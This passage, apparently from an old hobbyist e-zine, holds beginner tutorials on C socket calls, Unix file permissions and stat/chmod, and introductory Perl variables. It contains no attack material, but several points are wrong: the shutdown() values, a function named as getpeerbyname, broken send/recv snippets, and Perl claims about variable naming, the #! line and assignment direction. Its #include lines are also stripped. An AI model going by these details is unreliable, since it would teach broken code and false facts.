              different systems using the DARPA protocols (UDP/TCP/IP).
      
      'int type' is what type of connection you'll be using, the two most common 
      are:
              SOCK_STREAM - Used for connection oriented sockets, guaranteed data
              delivery, or an error will be received by the sender.
              SOCK_DGRAM - Used for connection less sockets, data delivery not
              guaranteed.
      
      In this paper we will focus on family AF_INET and type SOCK_STREAM.
      
      'int protocol' A protocol value of 0 is very common. This permits the
      system to choose the first protocol which is permitted with the pair of
      values specified for family and type.
      
      On success, a file descriptor is returned, on failure -1 is returned and
      errno is set accordingly. E.G:
      ------
      
      #include 
      #include 
      
      int sockfd /* soon to be socket file descriptor */
      
         sockfd = socket(AF_INET, SOCK_STREAM, 0)
         /* error checking here */
      
      ------
      And if all goes well, we now have a socket file descriptor that we can use
      across the Internet (AF_INET) using a connection based protocol
      (SOCK_STREAM) Remember, the protocol (0) is automatically set for us.
      
      =+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+=
      Giving your socket a name using: bind()
      
      Ok, now we have our socket created. The next thing is we need to do something with it.
      Lets try giving it a name using bind():
      ------
      
      #include 
      #include 
      
      int bind(int sockfd, struct sockaddr *name, int namelen)
      
      ------
      In a call to bind(), sockfd is the file descriptor for the socket, obtained 
      from the call to socket(). Name is a pointer to a structure of type sockaddr.
      If the address family is AF_UNIX (as specified when the socket is created),
      the structure is defined as follows:
      ------
      
      struct sockaddr {
                      u_short sa_family;
                      char    sa_data[14];
              };
      
      ------
      name.sa_family should be AF_UNIX. name.sa_data should contain up to 14
      bytes of a file name which will be assigned to the socket. namelen gives
      the actual length of name, that is, the length of the initialized contents
      of the data structure. E.G:
      ------
      
      #include 
      #include 
      
      struct sockaddr name;
      int sockfd;
      
         name.sa_family = AF_UNIX;
         strcpy(name.sa_data, "/tmp/whatever");
      
         sockfd = socket(AF_UNIX, SOCK_STREAM, 0)
         /* error checking code here */
      
         bind(s, &name, strlen(name.sa_data) + sizeof(name.sa_family)
         /* error checking code here */
      
      ------
      error checking note: on success bind() returns 0, on failure bind() returns
      -1 and sets errno accordingly.
      Now, in a call to bind using AF_INET we could use a different structure:
      -----
      
      struct sockaddr_in {
              short int          sin_family;  /* Address family               */
              unsigned short int sin_port;    /* Port number                  */
              struct in_addr     sin_addr;    /* Internet address             */
              unsigned char      sin_zero[8]; /* Same size as struct sockaddr */
          };
      
      ------
      This is bit bigger and more involved but isn't to hard at all. Lets look
      at an example: 
      ------
      
      #include 
      #include 
      #include 
      #include 
      
      int sockfd, port = 23;
      struct sockaddr_in my_addr;
      
         if((sockfd=socket(AF_INET, SOCK_STREAM, 0)) == -1)
         {
            printf("Socket Error, %d\n", errno);
            exit(1);
         }
        
         my_addr.sin_family = AF_INET; /* host byte order */
         my_addr.sin_port = htons(port); /* see man htons for more information */
         my_addr.sin_addr.s_addr = htonl(INADDR_ANY); /* get our address */
         bzero(&(my_addr.sin_zero), 8); /* zero out the rest of the space */
      
         if((bind(sockfd, (struct sockaddr *)&my_addr, sizeof(struct sockaddr)) == -1)
         {
            printf("Bind Error, %d\n", errno);
            close(sockfd);
            exit(1);
         }
      
      ------
      There you go, if all went well, our socket now has a name, and if all
      didn't go well, the error was reported and the program exited.
      A few small notes - if all your program does is connect to other computers,
      you don't need to use the bind() function at all (although it won't hurt
      anything). The line:  my_addr.sin_port = htons(port); can be automated to
      get it's own port by just setting the port to 0, good for client programs,
      bad for server programs as you don't know what port it's using.
      
      Now we have a socket, it's named, but it still doesn't do anything, that's
      not good...lets see if we can connect to another computer.
      
      =+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+=
      Remote connections using: connect()
      
      If you want to connect to a remote machine, there's no getting around
      using the connect() function:
      ------
      
      #include 
      #include 
      
      int connect(int sockfd, struct sockaddr *serv_addr, int addrlen); 
      
      ------
      sockfd is our friendly socket file descriptor returned from out call to socket()
      serv_addr is a struct sockaddr containing the destination port and IP address
      addrlen can be set to sizeof(struck sockaddr)
      Lets have another example:
      ------
      
      #include  
      #include  
      #include  
      
      #define DEST_IP   "132.241.5.10"
      #define DEST_PORT 23
      
      main()
      {
      int sockfd;
      struct sockaddr_in dest_addr;   /* will hold the destination addr */
      
         sockfd = socket(AF_INET, SOCK_STREAM, 0); /* do some error checking! */
      
         dest_addr.sin_family = AF_INET;        /* host byte order */
         dest_addr.sin_port = htons(DEST_PORT); /* short, network byte order */
         dest_addr.sin_addr.s_addr = inet_addr(DEST_IP);
         bzero(&(dest_addr.sin_zero), 8);       /* zero the rest of the struct */
      
         connect(sockfd, (struct sockaddr *)&dest_addr, sizeof(struct sockaddr));
         /* error checking code here */
        /* more code 
      .
      .
      .
       */
      }
      
      ------
      Again, connect() returns 0 on success, -1 on error and sets errno
      You may have noticed the lack of a call to bind() because we don't care what
      port we connect from, in a case like this the only port that matter is the
      one we're connecting to.
      
      =+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+=
      Listening for calls using: listen()
      
      Let's say we want to make a server program of some sort, we need some way
      to listen for incoming connections don't we, lets see if the listen()
      function works (it just might ya know ;))
      ------
      
      #include 
      #include 
      
      int listen(int sockfd, int backlog);
      
      ------
      sockfd again is our socket file descriptor
      backlog is how many connection we'll take at once
      
      Again, as usual, listen() returns -1 and sets errno on error. 
      Now in this case we will need to call bind() before we call listen() (we
      want a regular port for people to connect to instead of making them guess)
      Our function order so far would be:
      
      ------
      
      socket(); /* to create out socket file descriptor */
      bind(); /* to give our socket a name */
      listen(); /* listen for connection */
      
      ------
      
      =+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+=
      Taking the connection using: accept()
      
      Ok, this is where the...uhm...fun begins. Someone tries to connect to a
      port you happen to be listening on, you need to accept that connection
      now and accept() will do just that (who knew? ;))
      ------
      
      #include 
      #include 
      
      int accept(int sockfd, void *addr, int *addrlen);
      
      ------
      Again, sockfd is out friendly socket file descriptor
      addr is usually going to a pointer to a struct, struct sockaddr_in
      addrlen will be set to: sizeof(struct sockaddr_in)
      Can you guess what gets returned on error?...you got it...-1 and errno
      gets set. E.G:
      ------
      
      #include  
      #include  
      #include  
      
      #define MYPORT 1500    /* the port users will be connecting to */
      #define BACKLOG 5      /* how many pending connections queue will hold */
      
      main()
      {
      int sockfd, new_fd;  /* listen on sock_fd, new connection on new_fd */
      struct sockaddr_in my_addr;    /* my address information */
      struct sockaddr_in their_addr; /* connector's address information */
      int sin_size;
      
         sockfd = socket(AF_INET, SOCK_STREAM, 0); /* do some error checking! */
      
         my_addr.sin_family = AF_INET;         /* host byte order */
         my_addr.sin_port = htons(MYPORT);     /* short, network byte order */
         my_addr.sin_addr.s_addr = INADDR_ANY; /* auto-fill with my IP */
         bzero(&(my_addr.sin_zero), 8);        /* zero the rest of the struct */
      
         /* did you remember your error checking? */
         bind(sockfd, (struct sockaddr *)&my_addr, sizeof(struct sockaddr));
      
         listen(sockfd, BACKLOG);
      
         sin_size = sizeof(struct sockaddr_in);
         new_fd = accept(sockfd, &their_addr, &sin_size);
      
      ------
      Note that we will use the socket descriptor new_fd for all send() and
      recv() calls. If you're only getting one single connection, you can
      close() the original sockfd in order to prevent more incoming connections 
      on the same port, if you so desire.

      I think we need to talk: send() and recv()
      
      Now, we've created a socket, given it a name, listened for and accepted a
      connection, it's finally time to exchange information with send() and
      recv():
      ------
      
      #include 
      #include 
      
      int send(int sockfd, const void *msg, int len, int flags);
      int recv(int sockfd, void *buf, int len, unsigned int flags);
      
      ------
      send():
      sockfd - socket file descriptor
      msg - message to send
      len - size of message to send
      flags - read 'man send' for more info, set it to 0 for now :)
      
      recv():
      sockfd - socket file descriptor
      buf - data to receive
      len - size of buf
      flags - same as flags in send()
      
      send() example:
      ------
      
      char *msg = "Hey there people";
      int len, send_msg;
      
      /* code to create(), bind(), listen() and accept() */ 
      
      len = strlen(msg);
      bytes_sent = send(sockfd, msg, len, 0);
      
      ------
      recv() example:
      ------
      
      char *buf;
      int len, recv_msg;
      
      /* code to create(), bind(), listen() and accept() */
      
      len = strlen(buf);
      recv_msg = recv(sockfd, buf, len, 0);
      
      ------
      And again, both send() and recv() return -1 on error and set errno.
      If you're using type SOCK_DGRAM you use the sendto() and recvfrom()
      functions for sending and receiving data
      
      =+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+=
      Nice talking to you: close() and shutdown()
      
      Once you're finished exchanging data, it's time to close the connection by
      simply closing the socket:
      ------
      
      #include 
      
      /* all you code */
      
      close(sockfd);
      
      ------
      Pretty easy eh?  If you want a bit more control over how the connection
      gets closed you can use the shutdown() function:
      ------
      
      int shutdown(int sockfd, int how)
      
      ------
      There are three different values for how:
         1 - no more revc()'s allowed
         2 - no more sends are allowed
         3 - no more send()'s or recv()'s allowed (same as close())
      
      It's easy as that. You have now created a socket, given it a name, listened
      for connections, accepted connections, connected to other computers and
      closed the socket, not bad for a days work eh?
      
      =+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+=
      Who are you: getpeerbyname()
      
      So you want to know who it is that's connecting to you? Well you're in luck!
      There just so happens to be a function for just that purpose:
      ------
      
      #include 
      
      int getpeername(int sockfd, struct sockaddr *addr, int *addrlen);
      
      ------
      sockfd - our friendly socket file descriptor rears it's ugly head again
      addr - a pointer to either 'struct sockaddr' or 'struct sockaddr_in'
      addrlen - should be made to: sizeof(struct sockaddr)
      
      My oh my, getpeerbyname() also returns -1 on error, who would have guessed?
      If this call worked right, you now have the person's address and can use
      inet_ntoa() or gethostbyaddr() to print more info, not their login name
      though unless their running identd but that's beyond what we're talking
      about here. Read RFC 1413 for more information on that.
      
      =+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+=
      Who am I: gethostname()
      
      Ok, getpeerbyname() was easy, well, gethostame() is easier.
      ------
      
      #include 
      
      int gethostname(char *hostname, size_t size);
      
      ------
      hostname - an array of type char that will hold the host name on return
      size - size of the above mentioned array
      
      This returns the name of the computer your program is running on and can
      then be used with gethostbyname() to print out your IP address. Again, -1
      on error and sets errno.
      
      =+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+=
      What's your IP? 
      
      Well, lets put that information to use ok? We'll make our first, full
      fledged program, a DNS program. DNS or "Domain Name Service" is a way of
      getting a machines IP address by using it's "human-readable" address.
      Have you ever telneted to a machine and saw:
      
      $ telnet microsoft.com
        Trying 206.163.24.176 (not the real address but I'm too lazy to try :))
      
      Well guess what, the first thing the telnet program did was do a DNS check
      on microsoft.com so it could find the IP. Now, to do this well be using
      the function gethostbyname() which can be found in netdb.h
      ------
      
      #include  
          
      struct hostent *gethostbyname(const char *name);
      
      ------
      By looking at that you see it uses a structure called 'struct hostent'
      which looks like:
      ------
      
      struct hostent {
              char    *h_name;
              char    **h_aliases;
              int     h_addrtype;
              int     h_length;
              char    **h_addr_list;
          };
      #define h_addr h_addr_list[0]
      
      ------
      This structure breaks down to:
      
      h_name - Official name of host
      h_aliases - A NULL-terminated array of alternate names for the host. 
      h_addrtype - The type of address being returned; usually AF_INET. 
      h_length - The length of the address in bytes.
      h_addr_list - A zero-terminated array of network addresses for the host.
                    Host addresses are in Network Byte Order. 
      h_addr - The first address in h_addr_list
      
      gethostbyname() returns a pointer to the filled struct hostent, or NULL on
      error. (But errno is not set--h_errno is set instead. See 'man herror' for 
      more help) Now lets make our DNS program
      ------
      
      #include  
      #include  
      #include  
      #include  
      #include 
      #include  
      
      int main(int argc, char *argv[])
      {
         struct hostent *h;
      
         if (argc != 2) {  /* error checking on the command line */
            fprintf(stderr,"Usage: getip \n");
            exit(1);
         }
      
         if ((h=gethostbyname(argv[1])) == NULL) {  /* get the host info */
            herror("gethostbyname");
            exit(1);
         }
      
         printf("Host name  : %s\n", h->h_name);
         printf("IP Address : %s\n",inet_ntoa(*((struct in_addr *)h->h_addr)));
      
         return 0;
      }
      
      ------
      And there you go, small and easy, just the way we like it, compile it
      with: gcc -o getip getip.c (assuming you saved it as getip.c :))
      
      =+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+==+=
      Client and Server programs
      
      Ok, lets end this discussion with a small, and somewhat pointless,
      client-server application. The only purpose of this is for a user to
      connect to the server, receive a predefined string, then disconnect, but
      it should get the point across, I'll leave making it more useful as a job
      for you to do...oh, you can do the error checking in it to :)

      Well, I think that's about it for now. This is by no means the complete
      guide to socket programming, actually, it's very far from being that and
      was never intended to be that so no problem. For further reading on this
      topic I would suggest checking out the following man pages:
      
      socket, bind, connect, perror, herror, listen, accept, send, recv,  close,
      shutdown, getpeername, getsockname, gethostbyname, gethostbyaddr and
      getprotobyname.

      Well, this is it I guess, time to bid you a farewell and a happy journey
      into sockets programming. As I said before, this is *NOT* a complete
      manual, it is merely a small primer. There maybe huge errors in here that
      I've totally missed, oh well, such is life, I never claimed to be an
      expert ;) Maybe soon I'll get around to doing a paper on type SOCK_DGRAM
      and other such socket oddities. 'Till then, have fun.

      -------[ File permissions
                by Lamagra 
                http://bounce.to/unah16
      
      -----------[ Introduction
      
      Although permissions determine who can read, write or execute a file, they also determine the 
      file type, and how the file is executed.
      
      You can display the permissions of a file with the command 'ls -l'.
      An example listing might look like this:
      
      Drwx------ 2 tom users    512  Jan  3 13:44 Mail 
      Drwx------ 5 tom users   1024  Jan 17 08:22 nsmail
      drwx------ 2 root root    512  Dec 28 22:44 bin
      -rw-r--r-- 1 tom users  23801  Jan  4 15:05 picture.gif
      -rw------- 1 tom users    787  Jan 12 06:35 prog.c
      -rwx--x--x 1 tom users  44692  Jan 12 06:41 prog
           1     2  3    4      5         6         7
      
      The first column shows us the file permissions, the second column tells us the 
      number of links to the file, and the third column shows who owns the file. 
      The fourth column shows to what group the file belongs, the fifth column tells 
      the number of bytes used by the file. The sixth column holds the date and time 
      of creation, and the seventh shows the name.
      
      -----------[ Permissions
      
      The file permission field is divided into four sub-fields:
      
      - rwx rwx rwx
      
      The first sub-field defines the file type. 
      The different types are:
      
              -       normal file
              b       block device
              c       character device
              d       directory
              l       symbolic link
      
      The next tree sub-field define the actual file permissions.
      The first three characters are the user permissions, the next three the group permissions and the 
      last three are the permissions for everyone else. 
      The characters have the following meanings:
              
              r       read permission
              w       write permission
              x       permission to execute
              s       user ID bit
              t       sticky bit
      
      The sticky bit tells the system to save a copy of a running program in memory 
      after the program completes. This way the system can save a little amount of 
      time, the next time the program is executed. Because it doesn't have to be 
      reloaded into the memory.
      
      Permissions can be changed with the 'chmod' command in a absolute or relative manner. 
      The absolute manner uses octal permissions, the following table shows a list of 
      valid octal permissions.
      
              0001    executes permission for the everyone
              0002    write permission for the everyone
              0004    read permission for the everyone
              0010    execute permission for the group
              0020    write permission for the group
              0040    read permission for the group
              0100    execute permission for owner
              0200    write permission for owner
              0400    read permission for owner
              1000    sticky bit
              2000    group ID bit if the file is executable, otherwise mandatory file locking
              4000    user ID bit if the file is executable
      
      You give a file read, write permission for the owner and read permission for group and everyone 
      else in the following manner:
      
              0200    write permission for owner
              0400    read permission for owner
              0040    read permission for group
              0004    read permission for everyone
              ______________________________________
              0644    read and write for owner + read for everyone.
      
              chmod 644 file
      
      Relative permissions are slightly different. You have to state the following:
      
              * whom you're giving permissions to
              * what operation you intend to preform
              * what the permissions are
      
      whom:
              a       all users
              g       group
              o       others
              u       user
      
      operator:
              +       add 
              -       remove
              =       set
      
      permissions:
              the characters above
      
      
      example:
              read and write for owner + read for everyone
      
              chmod u=rw,g=r,o=r file
      
      
      -----------[ SUID and SGID
      
      SUID is short for Set User ID, and SGID is short for Set Group ID.
      When you run an executable file with these permissions, it's effective UID 
      (User ID) is set the same as the user that owns the file. 
      SGID is similar except it changes the GID (Group ID) instead.
      
      Although this feature is very useful, it can present a huge security hole.
      SUID programs are generally used when the program needs special permissions, 
      such as root permission, to run.
      
      
      -----------[ file permissions in C
      
      Every single bit of information about a file is found inside a structure
      called an i-node. To get that information you can use the three following
      system calls:
      
       int stat(const char *path, struct stat *statb);
      
       int lstat(const char *path, struct stat *statb);
      
       int fstat(int fd, struct stat *statb);
      
      "stat" is the most commonly used syscall of the three. It gets the
      information on a file using the path and places it into the structure
      statb.
      
      The only difference between lstat and stat is that when the file is a symbolic 
      link stat would return information about the file to wherever the link happens 
      to point to. While lstat actually returns info about the link itself. 
      Fstat takes a fd to an open file and reads info about the file.
      
      The structure stat can be found in /usr/include/sys/stat.h and is defined
      as the following:
      struct stat
         {
              dev_t         st_dev;       /* device */
              ino_t         st_ino;       /* inode */
              mode_t        st_mode;      /* file permissions */
              nlink_t       st_nlink;     /* number of hard links */
              uid_t         st_uid;       /* user ID of the owner */
              gid_t         st_gid;       /* group id of the owner */
              dev_t         st_rdev;      /* device type*/
              off_t         st_size;      /* total size in bytes */
              unsigned long st_blcksize;  /* blocksize for filesystem I/O */
              unsigned long st_blocks;    /* number of blocks */
              time_t        st_atime;     /* time of last access */
              time_t        st_mtime;     /* time of last modification */
              time_t        st_ctime;     /* time of last change */
         };
      
      st_dev: This is the major and minor device numbers of a device 
              on which the i-node associated with this file
              (and therefore the file itself) is stored.
      
      st_nlink: The number of links associated with a file. If a file has
                just been created, it has the value of '1'. This value is 
                incremented by 1 for every hard link that is made to
                the file.
      
      st_rdev: If the file is a character-special or block-special device
               then this field contains the major and the minor dev numbers
               of the file. (Unlike st_dev which has the major and minor
               dev numbers of the device on which the file is stored.)
      
      st_atime: The last time the file was accessed for reading or 
                the last time that it was executed, if executable.
      
      st_mtime: This is changed by write(), mknod(), utime(), and by changes
                in owner, group, hard link count, or mode.
      
      st_ctime: This is changed by writing and changes of i-node information 
                (owner, group, link count, etc.)
      
      st_blksize: A hint to programs about the best buffer size to use for
                  i/o operations on this file. 
      
      st_blocks: The total number of physical blocks that are actually allocated
                 on the disk for this file.
      
      
      st_mode member of struct stat defines both the file type and its 
      permission bits. The following constants are used to determine the file type:
      
              S_IFMT: bitmask for the file type bitfields.
              S_IFREG: Regular file
              S_IFDIR: Directory
              S_IFCHR: Character device
              S_IFBLK: Block device
              S_IFLNK: Symbolic link
              S_IFIFO: FIFO file
              S_IFSOCK: socket
      
      There are also a set of POSIX macros to check the file type:
      
              S_ISREG:  regular file.
              S_ISDIR:  directory.
              S_ISCHR:  character device.
              S_ISBLK:  block device.
              S_ISLNK:  symbolic link.
              S_ISFIFO: FIFO type file.
              S_ISSOCK: socket.
      
      The next constants, will give you information about a files ownership, 
      permission values etc. 
      
              S_ISUID: User ID bit set.
              S_ISGID: Group ID bit set.
              S_ISVTX: Sticky bit set.
              S_IRWXU: The owner has read, write and execution permission.
              S_IRUSR: The owner has read perms for the file (same as S_IREAD).
              S_IWUSR: The owner has write perms for the file (same as S_IWRITE).
              S_IXUSR: The owner has execute perms for the file (same as S_IEXEC).
              S_IRWXG: The group has read, write and execution permission.
              S_IRGRP: The group has read perms for the file.
              S_IWGRP: The group has write perms for the file.
              S_IXGRP: The group has execute perms for the file.
              S_IROTH: Everyone has read perms for the file.
              S_IWOTH: Everyone has write perms for the file.
              S_IXOTH: Everyone has execute perms for the file.

      -----------[ Changing file permissions in C
      
      If you need to change the file permissions, you can use this set of functions:
              chmod(const char *path, mode_t mode);
              fchmod(int fd, mode_t mode);
      For mode you can use the permission flags above or octal numbers.
      If your using octals, make sure they're always in a set of 5 numbers.
      
      example:
         use chmod("/tmp/bla", 00444) to make /tmp/bla readable for everyone.
      
      To change ownership, you can use these system calls:
              chown(const char *path, uid_t owner, gid_t group);
              lchown(const char *path, uid_t owner, gid_t group);
              fchown(int fd, uid_t owner, gid_t group);
      
      If owner/group is -1, the owner/group will remain the same as before.
      
      -----------[ Ending
      
      I hope you learned something new, although file permissions are really basic.
      For the next edition of the e-zine, I'll write some more difficult guides.
      
      Like always if you any further questions, remarks or anything. 
      You can find me on IRC (irc.box5.net) in some channel.

      Perl: Volume 1
      
      
              Hello and welcome to the Perl section of the list. This is
      Darkmo0n, Im gonna be writing some Perl tutorials for the list. When we're
      all done you should know enough Perl to make almost anything ya want. So..
      lets get started already.. 
      
      WHAT IS PERL:
      
              Perl (Practical Extraction and Reporting Language) and is an
      INTERPRETED language desgined by Larry Wall in the late 80's as a tool to
      create reports from many files on the UNIX operating system. As we learn
      more and more Perl, you will notice that many of its functions have to do
      with managing files, manipulating or searching strings or patterns. The
      fact that Perl is an interpreted language means that It does not need to
      be compiled or linked to be run, just a plain text file, like shell
      scripts. Unlike shell scripts, Perl offers the power and flexibility of
      high level languages like C, but does an excellent job of simplifying many
      tasks. For example, Perl internally handles all variable types. So the
      same variable can be used to hold strings, integers or other data types.
      And you can forget about malloc(), Perl handles all memory internally.
              As you'll see, Perl is extremly easy to learn, especially if you
      have any experiance with other programming languages, heh imagine.. even
      *I* learned Perl.
      
      GETTING PERL:
      
              Alright, in order to learn Perl, you need to get yourself the
      interpreter. It comes packaged with most Linux distributions. 
      
      Check if you already have it:
      -----------------------------
      Dark@darkness Dark >$ perl -v

      Complete documentation for Perl, including FAQ lists, should be found on
      this system using `man perl' or `perldoc perl'.  If you have access to the
      Internet, point your browser at http://www.perl.com/, the Perl Home Page.
      ---------------------------
      
      
      If you got a command not found, you can try other search utilities like
      whereis, locate, or find (Refer to the man pages if ya dont know how to
      use em). If you dont have Perl, run a search on freshmeat.net or another
      app finder to locate the latest version. 
      
              For you guys stuck in Win9x (I pity you, really. Get Linux for
      God's sake!), you can go to www.activestate.com to get a version of perl
      that will work for you. 
      
              NOTE: Not all commands that work *nix versions of Perl will work
      in the Win32 version (ex. getpwent(), and many of the file test
      functions). All perl scripts shown here are for the *nix version of perl. 
      
      
      PERL LESSON 1:
      
              OK, now that we have perl up and running, lets start learning
      already. Perl programs, like all high-level programming language's
      programs, are made up of statements. Like in C, every Perl statement must
      end in a ; (semicolon), and white space is ignored. For example, 
      
                      print "hello";
      
      is a valid Perl statement. 
      
              print 
                              "hello"
      
      
      
                                              ;
      
      is ALSO valid.
      
              print; "hello"
      
      INVALID.
      
              print "hello"
      
      INVALID (No semicolon).
      
      
      Now, lets do everyone's first program in ANY new language, Hello World.
      (NOTE: Line numbers are for reference only, dont type em in)
      
      
      1: #! /usr/bin/perl
      2: print "Hello, World!\n";
      
      Ok type that in in your favorite plain text editor (vi, notepad, pico
      whatever as long as it saves in plain text), and save it. To run a perl
      script in *NIX:
      
      Dark@darkness Dark >$ chmod +x hello.pl
      Dark@darkness Dark >$ ./hello.pl
      Hello, World!
      Dark@darkness Dark >$
      
      In Windows:
      
      C:\> perl hello.pl
      Hello, World!
      C:\>
      
      Alright, now lets take a look at the program....
      
      LINE 1: #! /usr/bin/perl
      
      That line contains the path to your Perl interpreter. ALL PERL PROGRAMS
      MUST START WITH THAT LINE. A program that doesnt start like that, will not
      run correctly. Also, if you want to run the interpreter with some command
      line options, you would include them there. For example, its good practice
      to run Perl with the -w switch, which increases the warnings on the
      scripts, which aids in debugging. To use the -w, change line 1 to:
      
      #! /usr/bin/perl -w 
      
      LINE 2: print "Hello, World\n";
      
      There's our first Perl statement, a print command. The syntax for print
      (for now) is:
      
              print "STRING";
      
              Prints STRING to STDOUT.
      
      \n is known as an escape sequence. If your'e familiar with C, you know
      that \n represents a New line character, signals the end of a line of text
      on the screen. There are several legal escape sequences in Perl, here are
      the more widely used ones:
      
              \a : Alarm (*beep*)
              \t : Tab
              \n : New line
              \r : Carriage Return
              \0xx : ASCII code for a character in Octal notation
              \xXX : ASCII code for a character in Hex.
      
      There are a few other common ones, but those will be covered when we do
      Regular Expressions and Patterns. 
      
      Comments in Perl are created by the #, pound sign. When a # is reached, the rest of the
      line is skipped. Notice the # on the first line of all Perl programs, that
      makes the interpreter skip that line. That line is for the shell/operating
      system's use only. 
      
      #! /usr/bin/perl
      
      # print "This line wont execute\n";
      
      $scalar = "adfas"; # this is a partial line comment
      
      
      Perl: Volume 2 - Variables & Operators
      
              Traditionally, the second lesson in any programming language is
      variables and data storage. Today, we will explore the 3 Perl variables
      types: Arrays, Scalars, and Hashes (No, there will be no pot in the hash
      section). After we cover the data types, we will also discuss mant of the
      simple operators Perl has to offer. After this lesson, you will know
      enough to make your own simple Perl programs. 
      
      NOTE: Complete dominance of these topics is REQUIRED to become a good Perl
      programmer, ESPECIALLY the section on arrays and hashes, since these are
      the main components of any complex data structure you will be creating in
      Perl. 
      
      ANOTHER NOTE: This volume is LONG (19 kb, four times more than the last
      one.), it took me three days to write it all. I recommend that you read
      the Variable section first, take a break, and then continue on the
      operators. If you attempt to read this all in one sitting, you are either
      really bored, or have a LOT of free time on your hands.
      
      FINAL NOTE BEFORE WE BEGIN: There are plenty of examples in this one, be
      sure to take a look at all of them and understand why they act the way
      they do. This will help you prevent many annoying bugs in your future
      programs. (For each of the examples I included, I have made those mistakes
      in the past with similar code, I included them so you wont have to.)
      
      ------------------------------------------------------------------------
      
      PERL VARIABLES:
      
              Perl has 3 different kinds of variables: Scalars, Arrays and
      Hashes. Each of these can be used to hold numbers, integers, floating
      point numbers, characters, strings etc. People familiar in C will find
      this quite different from what they are used to: there are no variable
      "type". For example, a scalar can be first used to hold a number, and
      later, without any modification, can be reassigned to a string. 
      
              To learn about the variable types, we need to know how to set
      them.
      
      The = Operator:
      
              The = operator assigns the value at the left, to the variable on
      the right. 
              In Perl, when you assign a value to a scalar, it ALWAYS must
      begin with a $ (dollar sign), array variables ALWAYS must begin with a @
      (an "at" sign) and hashes ALWAYS must begin with a % (percentage sign).
              Strings should always be in double quotes ("") or single quotes (''),
      since single back quotes (``) have special meaning in Perl (that will be
      covered later). Numeric values dont need to be quoted.
      
      -------------------------------------
      NOTE:
              Variables in Perl are CASE SENSITIVE. $scalar, $SCALAR, and
      $ScALAR are *DIFFERENT* variables. Personally, I use variables that hold
      more more permanent settings in all caps, while all regular variables in
      lowercase.
      
      NOTE:
              Also, variable names in Perl must be all alphanumberic characters
      (0-9, a-z, A-Z, _). The first letter in the variable name cant be a _. For
      example:
      
      $address LEGAL
      $new! NOT LEGAL
      $_temp NOT LEGAL
      
              Variables that contain non-alphanumeric characters are set
      internally by Perl, such as $_, $<, $>, $| and $#array. 
      
      LAST NOTE: Perl uses different variable space for each type of variable.
      You can have a scalar named $temp and an array named @temp defined at the
      same time: they wont interfere with each other. 
      -------------------------------------
      
      
      SCALARS: These variables hold single values or strings. For example:
      
      <++> perl/scalars.pl
      #! /usr/bin/perl -w
      
      $scalar = "This is a scalar variable:";
      $scalar2 = 3.1415926;
      print "$scalar $scalar2\n";
      <--> end scalars.pl
      
      OUTPUT: 
      
      Dark@darkness work >$ chmod +x scalars.pl
      Dark@darkness work >$ ./scalars.pl
      This is a scalar variable: 3.1415926
      Dark@darkness work >$
      
      
      ARRAYS: These variables hold more than one string, and is indexed by
      numbers. NOTE: Array subscripts start counting, by default, at the number
      0, like in many other languages. If you arent used to counting up from 0,
      you can change this by setting the special $[ scalar to the value you want
      to count from. Special variables, such as $[, $_, and others, will be
      discussed in detail in another volume. 
      
      For example:
      
      <++> perl/arrays.pl
      #! /usr/bin/perl
      
      @array = (2, 3, 4, "data", 34.023, "Im a 3l33t Perl h4x0r");
      
      print "$array[0]\n\n";
      print "$array[5]\n";
      
      <--> end arrays.pl
      
      OUTPUT:
      
      Dark@darkness Dark >$ chmod +x arrays.pl
      Dark@darkness Dark >$ ./arrays.pl
      2
      
      Im a 3l33t Perl h4x0r
      Dark@darkness Dark >$
      
      Some of the most observant ones of you might be asking "Why the hell is
      there a $ infront of the array name, if its not a scalar??". This is a
      point of confusion to many people beginning in Perl. When you refer to the
      ENTIRE array, it is prefixed with a @. When you refer to individual
      elements of the array, it is prefixed with a $. 
      You can assign values to members of an array like:
      
      $array[100] = "This is a string"; 
      
      Or you can assign the whole array at once using a LIST. Lets look at the
      declaration of @array in the previous example:
      
      @array = (2, 3, 4, "data", 34.023, "Im a 3l33t Perl h4x0r");
      
      This array is declared by a list. Lists are simply one or more values
      seperated by commas. Some Perl docs you may read refer to strings as
      lists with only one member, which is also correct.  
      
      
      HASHES: Now everyone's favorite variable type, the hash. Hashes are
      the most powerful data types in Perl. Their use might not be apparent
      right away, but when you start programming more complicated programs, its
      existance will make your life SO much easier. A hash is exactly like an
      array, just that its values are indexed by strings, not numbers.
      
      <++> perl/hash.pl 
      
      #! /usr/bin/perl
      
      %hash = ("RED", 0xFF0000, "GREEN", 0x00FF00, "BLUE", 0x0000FF);
      
      print "Red is: $hash{'RED'} in RGB\n";
      print "Green is: $hash{'GREEN'} in RGB\n";
      print "Blue is: $hash{'BLUE'} in RGB\n";
      
      <--> end hash.pl 
      
      OUTPUT:
      
      Dark@darkness Dark >$ chmod +x hash.pl
      Dark@darkness Dark >$ ./hash.pl
      Red is: 16711680 in RGB
      Green is: 65280 in RGB
      Blue is: 255 in RGB
      Dark@darkness Dark >$
      
      Hrmm.. something didnt go as planned.. in the hash declaration, we put
      0xFF0000 as RED, but the print function printed a "16711680". Why? In our
      declaration, 0xFF0000 was not quoted. Since it is a valid integer in hex,
      Perl changed it to decimal and then stored it into the hash. Then it was
      printed to stdout by print. How do we change this? In the declaration,
      quote the value for RED. This forces Perl to interpret it as a string, and
      does not do the conversion. 
      
      OUTPUT:
      
      Dark@darkness Dark >$ ./hash.pl
      Red is: 0xFF0000 in RGB
      Green is: 0x00FF00 in RGB
      Blue is: 0x0000FF in RGB
      Dark@darkness Dark >$
      
      Earlier we used the hex values in "numeric context," meaning that it was
      interpreted as a number. The second, it was used in string, or scalar
      context, meaning that it was interpreted as a string. Same values used in
      different contexts can have very different results. Here is another
      example using arrays:
      
      <++> perl/context.pl
      #! /usr/bin/perl
      
      @array = (23, 156, "this is an array");
